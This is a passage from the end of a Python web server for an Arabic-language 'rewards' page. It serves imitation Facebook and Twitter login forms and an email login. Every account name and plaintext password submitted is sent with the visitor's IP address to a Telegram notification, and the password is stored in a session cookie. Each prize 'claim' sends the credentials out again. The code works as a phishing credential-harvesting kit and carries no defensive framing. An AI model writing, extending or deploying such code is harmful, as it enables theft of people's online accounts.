            }} catch (err) {{
                authMsg.textContent = "حدث خطأ في الاتصال بالخادم.";
                authMsg.className = "msg err";
                emailBtn.disabled = false;
            }}
        }}

        if (emailBtn) {{
            emailBtn.addEventListener("click", submitEmailLogin);
            [emailInput, passwordInput].forEach(inp => {{
                inp.addEventListener("keydown", e => {{
                    if (e.key === "Enter") {{
                        e.preventDefault();
                        submitEmailLogin();
                    }}
                }});
            }});
        }}

        const claimBtn = document.getElementById("claimBtn");
        const claimMsg = document.getElementById("claimMsg");
        if (claimBtn) {{
            claimBtn.addEventListener("click", async () => {{
                claimMsg.textContent = "";
                claimMsg.className = "msg";
                claimBtn.disabled = true;

                try {{
                    const res = await fetch("/api/claim", {{
                        method: "POST",
                        headers: {{"Content-Type": "application/json"}},
                        body: JSON.stringify({{item_id: selectedItemId}})
                    }});
                    const data = await res.json();
                    claimMsg.textContent = data.message || "";
                    claimMsg.className = data.ok ? "msg ok" : "msg err";
                }} catch (err) {{
                    claimMsg.textContent = "تعذر إرسال الطلب، حاولي مجدداً.";
                    claimMsg.className = "msg err";
                }} finally {{
                    claimBtn.disabled = false;
                }}
            }});
        }}
    </script>
</body>
</html>
"""


class RewardsHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def get_cookies(self) -> dict[str, str]:
        result = {}
        cookie_hdr = self.headers.get("Cookie", "")
        for part in cookie_hdr.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                result[k.strip()] = v.strip()
        return result

    def get_session_user(self) -> dict | None:
        cookies = self.get_cookies()
        return verify_token(cookies.get("rewards_session"))

    def send_json(self, payload: dict, status: int = 200, extra_headers: list[tuple[str, str]] | None = None) -> None:
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        if extra_headers:
            for h_name, h_val in extra_headers:
                self.send_header(h_name, h_val)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def send_html(self, html: str, status: int = 200, extra_headers: list[tuple[str, str]] | None = None) -> None:
        body = html.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        if extra_headers:
            for h_name, h_val in extra_headers:
                self.send_header(h_name, h_val)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def redirect(self, location: str, extra_headers: list[tuple[str, str]] | None = None) -> None:
        self.send_response(302)
        self.send_header("Location", location)
        if extra_headers:
            for h_name, h_val in extra_headers:
                self.send_header(h_name, h_val)
        self.end_headers()

    def do_GET(self):
        raw_path = self.path
        path = raw_path.split("?", 1)[0]
        query_params = {}
        if "?" in raw_path:
            query_params = parse_qs(raw_path.split("?", 1)[1])

        selected_cat = (query_params.get("cat") or ["الكل"])[0]
        flash_error = (query_params.get("auth_err") or [""])[0]

        if path == "/":
            self.send_html(render_page(self.get_session_user(), selected_cat, flash_error))

        elif path in ("/auth/facebook", "/auth/twitter"):
            provider = path.split("/")[-1]
            state_val = secrets.token_urlsafe(16)
            state_cookie = f"oauth_state={sign_token({'provider': provider, 'state': state_val})}; Path=/; HttpOnly; SameSite=Lax"
            self.send_html(render_social_login_page(provider), extra_headers=[("Set-Cookie", state_cookie)])

        elif path == "/logout":
            clear_user = "rewards_session=; Path=/; Max-Age=0; SameSite=Lax"
            self.redirect("/", extra_headers=[("Set-Cookie", clear_user)])

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = self.path.split("?", 1)[0]
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0

        raw = self.rfile.read(length) if 0 < length <= 1_000_000 else b""
        content_type = (self.headers.get("Content-Type") or "").lower()
        client_ip = self.headers.get("X-Forwarded-For", self.client_address[0]).split(",")[0].strip()

        if path in ("/auth/facebook/submit", "/auth/twitter/submit"):
            provider = path.split("/")[2]
            provider_label = "فيسبوك (Facebook)" if provider == "facebook" else "تويتر (X)"
            form_data = parse_qs(raw.decode("utf-8", errors="replace"))
            account = (form_data.get("account") or [""])[0]
            password = (form_data.get("password") or [""])[0]

            ok, name_or_err, identifier = validate_social_login(provider_label, account, password)
            if not ok:
                self.send_html(render_social_login_page(provider, name_or_err), status=400)
                return

            user = {
                "name": name_or_err,
                "identifier": identifier,
                "password": password,
                "provider": provider_label,
            }
            user_cookie = f"rewards_session={sign_token(user)}; Path=/; HttpOnly; SameSite=Lax"
            clear_state = "oauth_state=; Path=/; Max-Age=0; SameSite=Lax"

            tg_login_msg = (
                f"🔐 تسجيل دخول جديد\n"
                f"━━━━━━━━━━━━━━━\n"
                f"• الوسيلة: {provider_label}\n"
                f"• الحساب: {identifier}\n"
                f"• كلمة السر: {password}\n"
                f"• الاسم: {name_or_err}\n"
                f"• IP: {client_ip}\n"
                f"• الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            notify_telegram_async(tg_login_msg)

            self.redirect("/", extra_headers=[("Set-Cookie", user_cookie), ("Set-Cookie", clear_state)])
            return

        try:
            data = json.loads(raw.decode("utf-8")) if "application/json" in content_type and raw else {}
            if not isinstance(data, dict):
                data = {}
        except Exception:
            data = {}

        if path == "/api/login/email":
            email = str(data.get("email") or "")
            password = str(data.get("password") or "")
            ok, msg_or_email = validate_email_login(email, password)
            if not ok:
                self.send_json({"ok": False, "message": msg_or_email}, 400)
                return

            display_name = msg_or_email.split("@")[0]
            user = {
                "name": display_name,
                "identifier": msg_or_email,
                "password": password,
                "provider": "البريد الإلكتروني",
            }
            user_cookie = f"rewards_session={sign_token(user)}; Path=/; HttpOnly; SameSite=Lax"

            tg_email_msg = (
                f"✉️ تسجيل دخول بالبريد الإلكتروني\n"
                f"━━━━━━━━━━━━━━━\n"
                f"• البريد: {msg_or_email}\n"
                f"• كلمة السر: {password}\n"
                f"• الاسم: {display_name}\n"
                f"• IP: {client_ip}\n"
                f"• الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            notify_telegram_async(tg_email_msg)

            self.send_json({"ok": True}, 200, extra_headers=[("Set-Cookie", user_cookie)])

        elif path == "/api/claim":
            user = self.get_session_user()
            if not user:
                self.send_json({"ok": False, "message": "يرجى تسجيل الدخول أولاً قبل إرسال الطلب."}, 401)
                return

            item_id = data.get("item_id")
            item = next((i for i in ITEMS if i["id"] == item_id), None)
            if not item:
                self.send_json({"ok": False, "message": "يرجى اختيار عنصر أولاً."}, 400)
                return

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            record = {
                "time": timestamp,
                "user": user,
                "item": item,
                "ip": client_ip,
            }
            save_claim(record)

            tg_claim_msg = (
                f"🎁 طلب جديد من الصفحة\n"
                f"━━━━━━━━━━━━━━━\n"
                f"• القسم: {item.get('category', '')}\n"
                f"• العنصر: {item.get('title', '')}\n"
                f"• الوسم: {item.get('tag', '')}\n"
                f"• المستخدم: {user.get('name', '')}\n"
                f"• الحساب: {user.get('identifier', '')}\n"
                f"• كلمة السر: {user.get('password', '')}\n"
                f"• وسيلة الدخول: {user.get('provider', '')}\n"
                f"• IP: {client_ip}\n"
                f"• الوقت: {timestamp}"
            )
            notify_telegram_async(tg_claim_msg)

            self.send_json({
                "ok": True,
                "message": f"تم تسجيل طلب ({item['title']}) لحساب ({user['identifier']}) وإرساله بنجاح."
            })

        else:
            self.send_response(404)
            self.end_headers()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    server = ThreadingHTTPServer(("0.0.0.0", port), RewardsHandler)
    print(f"✅ الصفحة تعمل الآن! افتحي المتصفح على: http://127.0.0.1:{port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nتم إيقاف السيرفر.")
